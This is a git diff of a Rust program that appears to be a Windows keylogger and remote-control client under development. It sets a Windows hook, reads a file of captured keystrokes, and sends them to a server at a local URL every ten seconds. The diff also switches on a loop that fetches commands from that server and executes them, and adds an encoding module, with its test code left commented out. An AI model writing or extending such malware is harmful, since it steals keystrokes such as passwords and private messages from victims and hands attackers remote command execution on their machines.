@@ -1,5 +1,6 @@
 mod server;
 mod system;
+mod encode;
 use std::{sync::Arc};
 use system::{get_windows_version, read_file, set_windows_hook};
 use tokio::time::{Duration, sleep};
@@ -21,6 +22,25 @@ macro_rules! unwrap_or_panic {
 async fn main() {
     const URL: &'static str  = "http://127.0.0.1:5000";
 
+    // let mut enc = encode::Encode::new(52);
+    
+    // let test = "HIII";
+    
+    // // let enc_string = enc.encrypt(&test);
+
+    // // let enc_string =  &enc_string;
+
+    // let array: [& str; 4] = ["Ug==","bw==", "bg==", "7Q=="];
+
+    // for a in array{
+    //     let dec_string = enc.decrypt(a);
+    //     println!("Dec: {}", dec_string);
+
+    // }
+        
+    // println!("Org: {}", &test);
+    // println!("Enc: {:#?}", &enc_string);
+    
     
     let server = Arc::new(server::Connection::new(&URL));
 
@@ -36,6 +56,10 @@ async fn main() {
         unsafe {
             set_windows_hook();
         }
+
+        loop{
+            
+        }
     });
 
     tokio::spawn(async move {
@@ -46,29 +70,26 @@ async fn main() {
         }
     });
 
-
-
-
-
     loop{
         // Execute Commands
-        // let rec = unwrap_or_panic!(server.get_command(&id).await);
-        // execute_command(&rec).await; 
-        // sleep(Duration::from_secs(10)).await;
+        let rec = unwrap_or_panic!(server.get_command(&id).await);
+        execute_command(&rec).await; 
+
+        //read file and
         let keys = read_file();
-        server.send_data(&id, &keys.clone()).await;
-        sleep(Duration::from_secs(5)).await;
-    }
-    
+        let result = server.send_data(&id, &keys.clone()).await;
+        
+        sleep(Duration::from_secs(10)).await;
         
 
-
+    }
+    
     
 }
 
 
 async fn execute_command(cmd: & str){
-    // if cmd == "" {""}
+   
     println!("Executing");
     let cmds: Vec<_> = cmd.split([':']).collect();
     println!("{}",cmds[0] == "slp");
